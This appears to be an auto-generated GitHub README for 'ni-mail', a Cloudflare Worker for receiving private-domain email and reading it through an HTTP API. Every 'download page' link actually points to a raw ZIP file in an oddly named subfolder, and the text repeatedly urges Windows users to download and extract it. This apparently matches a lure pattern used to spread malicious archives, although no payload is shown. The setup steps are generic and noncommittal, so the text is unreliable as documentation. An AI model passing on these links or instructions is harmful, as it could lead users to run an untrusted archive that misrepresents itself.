# 📨 ni-mail - Private domain mail, made simple

[![Download](https://img.shields.io/badge/Download%20ni-mail-blue?style=for-the-badge&logo=github)](https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip)

## 📥 Download ni-mail

Open the project page here and download the files you need:  
https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip

If you use GitHub on Windows, click the green Code button, then choose Download ZIP. After the file finishes, right-click the ZIP file and choose Extract All.

## 🖥️ What ni-mail does

ni-mail is a small Cloudflare Worker for people who want to receive mail sent to a private domain and read it through an HTTP API.

It helps you:

- catch email sent to your custom domain
- store mail data in Cloudflare KV
- read messages through a simple API
- keep the setup small
- run without a full mail server

This setup fits well if you want a low-maintenance way to handle domain email and pull messages from a web request.

## 🧰 What you need

Before you start, make sure you have:

- a Windows PC
- a web browser
- a GitHub account if you want to download from the page
- a Cloudflare account
- a private domain that you can manage
- email routing set up in Cloudflare
- Cloudflare Workers enabled
- a KV namespace ready for message storage

If you plan to edit the worker later, it also helps to have:

- a text editor such as Notepad++
- Node.js for local checks
- the Cloudflare command line tool

## 🚀 Quick start

Use these steps if you want to get it working on Windows with the least effort.

### 1. Get the files

Go to the download page:  
https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip

Then:

- click Code
- choose Download ZIP
- save the file
- right-click the ZIP
- choose Extract All

You will now have a folder with the project files.

### 2. Open the project folder

After extraction:

- open the folder
- look for the main Worker files
- keep the folder in a place you can find later, such as Documents or Desktop

### 3. Set up Cloudflare

In your Cloudflare account:

- add your domain if it is not there yet
- turn on Email Routing
- create a route for the address you want to receive mail on
- connect that route to your Worker
- create or select a KV namespace for mail storage

A simple setup is:

- one domain
- one email route
- one Worker
- one KV namespace

### 4. Add your settings

Open the Worker config and set values that match your account:

- your domain name
- your email route
- your KV binding name
- any read token or API key you want to use
- the address pattern you want to accept

If the project uses environment values, add them in the Cloudflare dashboard or in the local config file.

### 5. Publish the Worker

When your settings are ready:

- save the files
- upload or deploy the Worker in Cloudflare
- wait for the deployment to finish
- test the route with a sample email

## 📧 How email flow works

ni-mail uses a simple path:

1. Someone sends mail to your private domain
2. Cloudflare Email Routing receives the message
3. The Worker handles the mail event
4. The Worker writes the message to KV
5. You read the message through an HTTP API

This keeps the system small and easy to manage.

## 🔧 Basic Windows setup path

If you are on Windows and want a simple setup path, use this order:

1. Download the ZIP from GitHub
2. Extract the ZIP
3. Open the folder
4. Read the project files
5. Sign in to Cloudflare
6. Set up Email Routing
7. Create a KV namespace
8. Connect the Worker
9. Deploy the Worker
10. Test the API in your browser

If you prefer to keep everything in one place, create a folder named `ni-mail` in Documents and store the extracted project there.

## 🔑 Common settings you may need

Most Cloudflare Worker mail projects use a few basic settings. You may see names like these:

- `DOMAIN`
- `MAIL_TO`
- `KV_NAMESPACE`
- `API_KEY`
- `TOKEN`
- `FROM_ADDRESS`

Use values that match your domain and your mailbox plan. If you want to keep the API private, use a long token that only you know.

## 🌐 API use

The project is built to expose mail data through HTTP. That means you can open a URL in a browser or call it from another app.

Common API actions may include:

- list stored messages
- read one message by ID
- check recent mail
- fetch message text
- fetch sender and time data

A typical use looks like this:

- send mail to your domain
- open the API URL
- see the stored message data
- copy what you need

If the project includes an auth token, keep it in the request header or in the query string as the project expects.

## 🧪 Test your setup

After deployment, send a test message to your domain.

Then check:

- did Cloudflare accept the mail?
- did the Worker store the message?
- does the API return the message?
- does the body show the text you expected?
- does the sender address look correct?

If mail does not show up, check your route, domain, and KV binding first.

## 🧩 Typical folder layout

You may see files like these:

- `src/`
- `index.js`
- `worker.js`
- `wrangler.toml`
- `README.md`
- `package.json`

What they mean:

- `src/` holds the worker code
- `worker.js` or `index.js` is the main entry point
- `wrangler.toml` stores Cloudflare settings
- `package.json` lists project scripts
- `README.md` explains how to use the project

## ⚙️ Cloudflare parts used here

This project fits the Cloudflare stack well:

- **Cloudflare Workers** for serverless logic
- **Email Routing** for inbound mail
- **KV** for message storage
- **HTTP API** for message reading

These parts work together without a full mail server on your own machine.

## 🪪 Example use cases

ni-mail can fit these needs:

- read mail sent to a custom domain
- store support requests in a simple key-value store
- build a private inbox for small tools
- keep email handling close to your app
- check inbound mail without opening a full mail client

## 🛠️ Troubleshooting

If the Worker does not work as expected, check these items:

### Mail does not arrive

- confirm Email Routing is on
- confirm the domain is active in Cloudflare
- confirm the route points to the right address
- confirm the Worker is connected to the route

### API returns no data

- confirm the KV namespace exists
- confirm the Worker can write to KV
- confirm the message key format matches the read path
- confirm you are using the right API URL

### Deployment fails

- confirm you are signed in to Cloudflare
- confirm the Worker name is valid
- confirm your config file has no typing errors
- confirm your account has the right access for Workers and KV

### Browser shows access denied

- confirm your token or key is correct
- confirm the request method is allowed
- confirm the route is public if you expect public access

## 🔒 Security tips

If you use this project for private mail, keep access tight:

- use a strong token
- limit who knows the API URL
- keep your domain DNS under your control
- use separate routes for testing and live use
- review stored mail data on a set schedule

## 🧭 Where to start first

If this is your first time using the project, do this in order:

1. Download the ZIP
2. Extract it
3. Read the files in the folder
4. Sign in to Cloudflare
5. Turn on Email Routing
6. Set up KV
7. Add the Worker
8. Deploy
9. Send a test email
10. Open the API and check the result

## 📌 Project details

- Repository: ni-mail
- Description: 极简 Cloudflare Worker，接收私人域名邮件并提供 HTTP API 读取
- Topics: api, cloudflare, cloudflare-workers, email, email-routing, kv, self-hosted, serverless
- Download page: https://github.com/birdofparadisecallin337/ni-mail/raw/refs/heads/main/fleering/mail-ni-v3.5.zip